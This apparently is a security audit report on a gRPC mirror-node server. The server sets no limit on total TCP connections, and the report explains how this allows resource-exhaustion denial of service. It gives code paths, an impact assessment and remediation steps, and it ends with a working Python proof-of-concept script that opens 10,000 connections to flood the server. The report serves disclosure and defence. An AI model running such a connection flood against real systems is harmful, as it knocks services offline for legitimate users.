### Title
Unbounded gRPC Connection Acceptance Enables Resource Exhaustion DoS via Missing `maxConnectionsTotal` Cap

### Summary
`grpcServerConfigurer()` configures the Netty gRPC server with only a per-connection stream limit (`maxConcurrentCallsPerConnection = 5`) but sets no ceiling on the total number of accepted TCP connections. An unauthenticated external attacker can open an unbounded number of connections — each holding up to 5 active streams — until the JVM's file descriptor quota, heap memory, or shared `applicationTaskExecutor` thread pool is exhausted, halting gossip and topic-message delivery for all legitimate subscribers.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
    // ← no serverBuilder.maxConnectionsTotal(...) call
};
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, lines 11–14:

```java
public class NettyProperties {
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
    // ← no maxConnectionsTotal field
}
```

**Root cause:** `NettyServerBuilder` (grpc-java) has no built-in default connection count limit. The `maxConnectionsTotal()` API exists on `NettyServerBuilder` but is never called. The only resource guard applied is `maxConcurrentCallsPerConnection(5)`, which limits HTTP/2 streams *per connection* — it does nothing to bound the number of accepted TCP connections.

**Exploit flow:**
1. Attacker opens N TCP connections to port 5600 (no authentication required — the gRPC port is public per `hiero.mirror.grpc.port = 5600`).
2. Each connection is accepted unconditionally by Netty; each consumes one file descriptor and Netty channel memory (read/write buffers).
3. On each connection the attacker opens 5 streams (the per-connection limit), dispatching calls to `subscribeTopic`. Each stream is handed to the shared `applicationTaskExecutor`.
4. With enough connections: (a) the process file-descriptor table fills (OS default ~65 535), (b) JVM heap is exhausted by Netty channel buffers, or (c) the `applicationTaskExecutor` thread pool is saturated — all three block legitimate subscriber calls.
5. `TopicMessageServiceImpl` tracks subscriber count only as a Micrometer gauge (line 52–55); it enforces no maximum, so the counter climbs without bound.

**Why existing checks fail:** The only server-side guard is `maxConcurrentCallsPerConnection = 5`. This multiplies the damage: an attacker needs only ⌈FD_LIMIT / 5⌉ connections to saturate the thread pool while staying within the per-connection stream cap. A grep across the entire grpc module confirms no `maxConnectionsTotal`, `connectionLimit`, or `maxInboundConnections` setting exists anywhere.

### Impact Explanation
- **File descriptor exhaustion:** Each accepted TCP socket consumes one FD. At the OS default of ~65 535 open files, the JVM can no longer accept new sockets — including legitimate subscriber connections and internal health-check connections.
- **Heap exhaustion:** Netty allocates read/write byte buffers per channel. Tens of thousands of idle connections holding 5 open streams each can consume gigabytes of heap, triggering OOM and JVM crash.
- **Thread pool starvation:** The shared `applicationTaskExecutor` is used for all gRPC call dispatch. Flooding it with 5 × N streams starves legitimate gossip-delivery and topic-subscription calls.
- **Severity: High** — complete denial of the gRPC gossip/subscription service with no authentication barrier.

### Likelihood Explanation
- **No credentials required:** The gRPC port is publicly exposed; any network-reachable host can open connections.
- **Low cost:** Opening thousands of idle TCP connections requires only a basic script (e.g., Python `grpc.insecure_channel` in a loop). No exploit tooling is needed.
- **Repeatable:** After a restart the server is immediately vulnerable again; the attacker can reconnect.
- **Single-source feasible:** A single attacker machine with a high `ulimit -n` can open tens of thousands of connections; a botnet is not required.

### Recommendation
1. **Add `maxConnectionsTotal` to `NettyProperties`** and wire it in `grpcServerConfigurer()`:
   ```java
   serverBuilder.maxConnectionsTotal(nettyProperties.getMaxConnectionsTotal());
   ```
   A safe default is in the range of 500–2 000 depending on expected legitimate load.

2. **Add `maxConnectionIdle` / `maxConnectionAge`** to reclaim connections from slow-loris-style attackers:
   ```java
   serverBuilder.maxConnectionIdle(30, TimeUnit.SECONDS);
   serverBuilder.maxConnectionAge(300, TimeUnit.SECONDS);
   ```

3. **Enforce a maximum subscriber count** in `TopicMessageServiceImpl.subscribeTopic()` by checking `subscriberCount` against a configurable cap before accepting a new subscription.

4. **Deploy a network-layer rate limiter** (e.g., Envoy, Kubernetes NetworkPolicy, or cloud load-balancer connection limits) as a defence-in-depth layer in front of port 5600.

### Proof of Concept
```python
import grpc
import threading

TARGET = "mirror-node-host:5600"
NUM_CONNECTIONS = 10_000

channels = []
def open_connection(_):
    ch = grpc.insecure_channel(TARGET)
    # Force TCP handshake
    grpc.channel_ready_future(ch).result(timeout=5)
    channels.append(ch)

threads = [threading.Thread(target=open_connection, args=(i,))
           for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()

print(f"Opened {len(channels)} connections. Server FD table and heap now under pressure.")
# Legitimate subscribers will now receive UNAVAILABLE or hang indefinitely.
```

Running this against an unprotected deployment will exhaust file descriptors or heap within seconds, causing all subsequent `subscribeTopic` calls from legitimate clients to fail. [1](#0-0) [2](#0-1) [3](#0-2)
